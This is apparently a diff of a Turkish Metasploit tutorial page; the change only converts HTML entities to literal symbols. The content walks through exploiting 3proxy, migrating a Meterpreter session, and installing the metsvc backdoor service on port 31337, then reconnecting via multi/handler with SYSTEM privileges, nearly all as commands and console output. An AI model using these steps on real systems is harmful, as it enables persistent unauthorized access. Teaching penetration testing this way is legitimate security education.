@@ -34,12 +34,12 @@ metsvc hakkında bilmeniz gereken önemli bir noktayı vurgulayalım. **Bu servi
 
 
 ```bash
-msf exploit**(**3proxy**)** **&gt;** exploit
+msf exploit**(**3proxy**)** **>** exploit
 
 **[*********]** Started reverse handler
 **[*********]** Trying target Windows XP SP2 - English...
 **[*********]** Sending stage **(**719360 bytes**)**
-**[*********]** Meterpreter session 1 opened **(**192.168.1.101:4444 -&gt; 192.168.1.104:1983**)**
+**[*********]** Meterpreter session 1 opened **(**192.168.1.101:4444 -> 192.168.1.104:1983**)**
 ```
 
 
@@ -48,7 +48,7 @@ msf exploit**(**3proxy**)** **&gt;** exploit
 
 
 ```bash
-meterpreter **&gt;** ps
+meterpreter **>** ps
 
 Process list
 **============**
@@ -79,7 +79,7 @@ Process list
     2840  3proxy.exe           C:\3proxy\b**in**\3proxy.exe
     3000  mmc.exe              C:\WINDOWS\system32\mmc.exe
 
-meterpreter **&gt;** migrate 632
+meterpreter **>** migrate 632
 **[*********]** Migrating to 632...
 **[*********]** Migration completed successfully.
 ```
@@ -90,7 +90,7 @@ meterpreter **&gt;** migrate 632
 
 
 ```bash
-meterpreter **&gt;** run metsvc -h
+meterpreter **>** run metsvc -h
 **[*********]**
 OPTIONS:
 
@@ -98,7 +98,7 @@ OPTIONS:
     -h        This help menu
     -r        Uninstall an existing Meterpreter service **(**files must be deleted manually**)**
 
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -107,18 +107,18 @@ meterpreter **&gt;**
 
 
 ```bash
-meterpreter **&gt;** run metsvc
+meterpreter **>** run metsvc
 **[*********]** Creating a meterpreter service on port 31337
 **[*********]** Creating a temporary installation directory C:\DOCUME~1\victim\LOCALS~1\Temp\JplTpVnksh...
-**[*********]**  **&gt;&gt;** Uploading metsrv.dll...
-**[*********]**  **&gt;&gt;** Uploading metsvc-server.exe...
-**[*********]**  **&gt;&gt;** Uploading metsvc.exe...
+**[*********]**  **>>** Uploading metsrv.dll...
+**[*********]**  **>>** Uploading metsvc-server.exe...
+**[*********]**  **>>** Uploading metsvc.exe...
 **[*********]** Starting the service...
 **[*********]**      ***** Installing service metsvc
  ***** Starting service
 Service metsvc successfully installed.
 
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -131,14 +131,14 @@ Hedef sistemde dinleme durumundaki `metsvc` ile haberleşmek için `windows/mets
 
 
 ```bash
-msf **&gt;** use exploit/multi/handler
-msf exploit**(**handler**)** **&gt;** set PAYLOAD windows/metsvc_bind_tcp
-PAYLOAD **=&gt;** windows/metsvc_bind_tcp
-msf exploit**(**handler**)** **&gt;** set LPORT 31337
-LPORT **=&gt;** 31337
-msf exploit**(**handler**)** **&gt;** set RHOST 192.168.1.104
-RHOST **=&gt;** 192.168.1.104
-msf exploit**(**handler**)** **&gt;** show options
+msf **>** use exploit/multi/handler
+msf exploit**(**handler**)** **>** set PAYLOAD windows/metsvc_bind_tcp
+PAYLOAD **=>** windows/metsvc_bind_tcp
+msf exploit**(**handler**)** **>** set LPORT 31337
+LPORT **=>** 31337
+msf exploit**(**handler**)** **>** set RHOST 192.168.1.104
+RHOST **=>** 192.168.1.104
+msf exploit**(**handler**)** **>** show options
 
 Module options:
 
@@ -162,11 +162,11 @@ Exploit target:
    0   Wildcard Target
 
 
-msf exploit**(**handler**)** **&gt;** exploit
+msf exploit**(**handler**)** **>** exploit
 
 **[*********]** Starting the payload handler...
 **[*********]** Started bind handler
-**[*********]** Meterpreter session 2 opened **(**192.168.1.101:60840 -&gt; 192.168.1.104:31337**)**
+**[*********]** Meterpreter session 2 opened **(**192.168.1.101:60840 -> 192.168.1.104:31337**)**
 ```
 
 
@@ -175,7 +175,7 @@ Gördüğünüz gibi `session 2` otomatik olarak açıldı. Şimdi, `metsvc` ser
 
 
 ```bash
-meterpreter **&gt;** ps
+meterpreter **>** ps
 
 Process list
 **============**
@@ -206,11 +206,11 @@ Process list
    1000  Explorer.exe       C:\WINNT\Explorer.exe                                 
    1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 
-meterpreter **&gt;** pwd
+meterpreter **>** pwd
 C:\WINDOWS\system32
-meterpreter **&gt;** getuid
+meterpreter **>** getuid
 Server username: NT AUTHORITY\SYSTEM
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
